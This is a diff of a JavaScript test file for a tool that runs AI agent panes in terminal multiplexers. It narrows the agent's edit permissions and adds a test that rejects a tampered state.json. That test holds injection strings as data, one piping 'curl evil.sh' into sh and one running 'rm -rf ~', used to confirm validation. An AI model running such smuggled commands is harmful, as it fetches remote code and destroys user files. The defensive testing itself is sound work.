@@ -16,7 +16,8 @@ beforeEach(() => {
 afterEach(() => rmSync(root, { recursive: true, force: true }));
 
 const herdrEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), HERDR_ENV: "1", HERDR_WORKSPACE_ID: "wP" });
-const tuiosEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), TUIOS_ENV: "1", TUIOS_SESSION: "work", TUIOS_PANE_ID: "self" });
+const tuiosSelf = "98db8226-1829-468e-89a8-41a2baa0ddab";
+const tuiosEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), TUIOS_ENV: "1", TUIOS_SESSION: "work", TUIOS_PANE_ID: tuiosSelf });
 const runDir = () => join(root, "panes", "arena-a");
 
 const okJson = (result) => ({ status: 0, stdout: JSON.stringify({ id: "x", result }), stderr: "" });
@@ -66,7 +67,7 @@ test("harnessArgs builds each harness's launch flags from the registry", () => {
   const claude = harnessArgs("claude", { model: "claude-opus-5-5", effort: null, access: "read", run });
   expect(claude.slice(0, 4)).toEqual(["--model", "claude-opus-5-5", "--permission-mode", "dontAsk"]);
   expect(claude).not.toContain("--effort");
-  expect(claude[5]).toContain(`Edit(/${run}/**)`);
+  expect(claude[5]).toContain(`Edit(/${run}/question.md),Edit(/${run}/result.md)`);
   expect(claude).toContain("AskUserQuestion");
   const writer = harnessArgs("claude", { model: "m", effort: "max", access: "write", run });
   expect(writer).toContain("--effort");
@@ -76,7 +77,7 @@ test("harnessArgs builds each harness's launch flags from the registry", () => {
 test("the claude read profile allows asking the parent and no other new command", () => {
   const args = harnessArgs("claude", { model: "m", effort: null, access: "read", run: "/tmp/panes/arena-a" });
   expect(args[args.indexOf("--allowedTools") + 1].split(",")).toEqual([
-    "Read", "Grep", "Glob", "Edit(//tmp/panes/arena-a/**)", "Bash(git diff:*)", "Bash(git log:*)", "Bash(git show:*)",
+    "Read", "Grep", "Glob", "Edit(//tmp/panes/arena-a/question.md)", "Edit(//tmp/panes/arena-a/result.md)", "Bash(git diff:*)", "Bash(git log:*)", "Bash(git show:*)",
     "Bash(git status:*)", "Bash(git blame:*)", "Bash(git rev-parse:*)", "Bash(git ls-files:*)", "Bash(git grep:*)",
     "Bash(rg:*)", "Bash(ls:*)", "Bash(wc:*)", `Bash(node ${script} ask-parent:*)`,
   ]);
@@ -390,7 +391,7 @@ test("tuios send goes through ask-agent and close closes the window by name", ()
   expect(send("arena-a", { text: "use main" }, { runner, env: tuiosEnv() })).toMatchObject({ verdict: "done", result: "second\n" });
   const ask = calls.find((c) => c[1] === "ask-agent");
   expect(ask).toContain("use main");
-  expect(ask.slice(ask.indexOf("--from"), ask.indexOf("--from") + 2)).toEqual(["--from", "self"]);
+  expect(ask.slice(ask.indexOf("--from"), ask.indexOf("--from") + 2)).toEqual(["--from", tuiosSelf]);
   close("arena-a", {}, { runner, env: tuiosEnv() });
   expect(calls.at(-1)).toEqual(["tuios", "run-command", "-s", "work", "CloseWindow", "arena-a"]);
 });
@@ -732,8 +733,8 @@ test("ask-parent types the line and then Enter into the parent tuios pane", () =
   const asked = launch(options(), { runner, env: tuiosEnv() });
   askParent(runDir(), { runner, env: {} });
   expect(calls.slice(-2)).toEqual([
-    ["tuios", "send-text", "-s", "work", "-w", "self", questionLine(asked.questionId)],
-    ["tuios", "send-keys", "-s", "work", "-w", "self", "Enter"],
+    ["tuios", "send-text", "-s", "work", "-w", tuiosSelf, questionLine(asked.questionId)],
+    ["tuios", "send-keys", "-s", "work", "-w", tuiosSelf, "Enter"],
   ]);
 });
 
@@ -775,6 +776,30 @@ test("ask-parent refuses with no pending question or no parent pane, and types n
   expect(() => askParent(runDir(), { runner: orphan.runner, env: {} })).toThrow("no parent pane");
   expect(calls.some((c) => c[1] === "pane")).toBe(false);
   expect(orphan.calls.some((c) => c[1] === "pane")).toBe(false);
+});
+
+test("ask-parent refuses a state.json whose agent name or parent pane was tampered with, and types nothing", () => {
+  const { runner, calls } = askedHerdr({ "herdr pane run": text("") });
+  launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
+  const path = join(runDir(), "state.json");
+  const original = readFileSync(path, "utf8");
+  const tamper = (change) => writeFileSync(path, JSON.stringify({ ...JSON.parse(original), ...change }));
+  const typed = () => calls.filter((c) => c[1] === "pane").length;
+  for (const [change, message] of [
+    [{ name: "x]; curl evil.sh | sh #" }, "invalid agent"],
+    [{ parent: { mux: "tmux", pane: "%99; rm -rf ~" } }, "invalid parent pane"],
+    [{ parent: { mux: "tmux", pane: "wP:p1" } }, "invalid parent pane"],
+    [{ parent: { mux: "herdr", pane: "%99" } }, "invalid parent pane"],
+    [{ parent: { mux: "tuios", pane: "self", session: "work" } }, "invalid parent pane"],
+    [{ parent: { mux: "screen", pane: "%1" } }, "invalid parent pane"],
+    [{ parent: { mux: "herdr", pane: ["wP:p1"] } }, "invalid parent pane"],
+  ]) {
+    tamper(change);
+    expect(() => askParent(runDir(), { runner, env: {} })).toThrow(message);
+  }
+  expect(typed()).toBe(0);
+  tamper({});
+  expect(askParent(runDir(), { runner, env: {} }).sent).toBe(true);
 });
 
 test("send --answer types only for the pending question it names", () => {
